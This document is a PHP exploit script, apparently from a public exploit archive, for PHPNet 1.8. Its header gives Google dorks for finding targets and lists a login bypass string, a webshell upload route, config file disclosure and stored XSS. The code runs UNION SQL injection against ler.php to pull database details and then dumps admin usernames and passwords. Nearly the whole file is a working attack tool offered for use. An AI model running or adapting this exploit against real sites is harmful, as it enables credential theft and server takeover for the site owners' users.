<?php 
# Exploit Title: PHPNet <= 1.8 (ler.php) SQL Injection
# Exploit Author: WhiteCollarGroup
# Date: 06th 06 2012
# Vendor homepage: http://www.phpnet.com.br/
# Software Link: http://phpbrasil.com/script/Wb03ErMczAho/phpnetartigos
# Google Dork: intext:"Powerd by Nielson Rocha"
# Google Dork: inurl:"ler.php?id=" intext:"Voltar - Imprimir"
# Version: 1.8
# Tested on: Debian GNU/Linux,Windows 7 Ultimate

/*
We discovered multiple vulnerabilities on the system.

  ~> SQL Injection
This exploit is for a vulnerability in ler.php, but are the same vulnerability on imprimir.php and imagem.php.
ler.php?id=[SQLi]
imprimir.php?id=[SQLi]
imagem.php?id=[SQLi]

Usage:
php file.php http://server/path/

  ~> Login bypass
In login page, you can bypass the login using "SQLi strings".
Go to http://server/path/admin/login.php

Login: ' or 1=1-- wc
Pass: wcgroup

  ~> Arbitraty File Upload
  After open administration panel, try to add a new article.
  Use the upload form to upload your webshell.
  After posting, access:
  http://server/path/tmp/your_shell_filename.php
  
  ~> Information disclosure
  Access:
  http://server/path/conf/config.ini
  
  ~> XSS Stored (persistent)
  When posting a new article, you can post (D)HTML/Javascript codes on the page.
  
*/
 
function _printf($str) {
    echo $str."\n";
}

function hex($string){
    $hex=''; // PHP 'Dim' =]
    for ($i=0; $i < strlen($string); $i++){
        $hex .= dechex(ord($string[$i]));
    }
    return '0x'.$hex;
}

set_time_limit(0);
error_reporting(E_ERROR & E_USER_WARNING);
@ini_set('default_socket_timeout', 30);
echo "\n";
 
echo "PHPNet <= 1.8 SQLi Exploit\n";
echo "Discovered by WhiteCollarGroup\n";
echo "www.wcgroup.host56.com - whitecollar_group@hotmail.com";
if($argc!=2) {
    _printf("Usage:");
    _printf("php $argv[0] <target>");
    _printf("Example:");
    _printf("php $argv[0] http://site.com/path/");
    exit;
}

$target = $argv[1];
if(substr($target, (strlen($target)-1))!="/") { // se o ultimo caractere nao for uma barra
    $target .= "/"; 
}

$inject = $target . "ler.php?id=-0'%20"; 

$token = uniqid();
$token_hex = hex($token);

// vamos agora obter os seguintes dados: user() version()
echo "\n\n[*] Trying to get informations...\n";

$infos = file_get_contents($inject.urlencode("union all select 1,2,3,4,concat(".$token_hex.",version(),".$token_hex.",user(),".$token_hex."),6,7,8-- "));
$infos_r = array();
preg_match_all("/$token(.*)$token(.*)$token/", $infos, $infos_r);
$user = $infos_r[1][0];
$version = $infos_r[2][0];
if(($user) AND ($version)) 
{
    echo "[!] MySQL user: $user\n";
    echo "[!] MySQL version: $version\n";
} 
else
{
    echo "[-] Error while getting informations...\n";
}

$i = 0;
while(1==1) {
    $dados_r = array();
    $dados = file_get_contents($inject.urlencode("union all select 1,2,3,4,concat(".$token_hex.",admin_user,".$token_hex.",admin_pass,".$token_hex."),6,7,8 from pna_admin limit $i,1-- "));
    preg_match_all("/$token(.*)$token(.*)$token/", $dados, $dados_r);
    $login = $dados_r[1][0];
    $senha = $dados_r[2][0];
    if(($login) AND ($senha)) {
        echo "    -+-\n";
        echo "[!] User: $login\n";
        echo "[!] Pass: $senha\n";
        $i++;
    } else {
        break; // exitloop
    }
    
    if($i==0) {
        echo "[-] Exploit failed. Make sure that's server is using a valid version of PHPNet without mod_security. We're sorry.";
    } else {
		echo "    -+-\n[!] :D";
	}
	echo "\n";
}

?>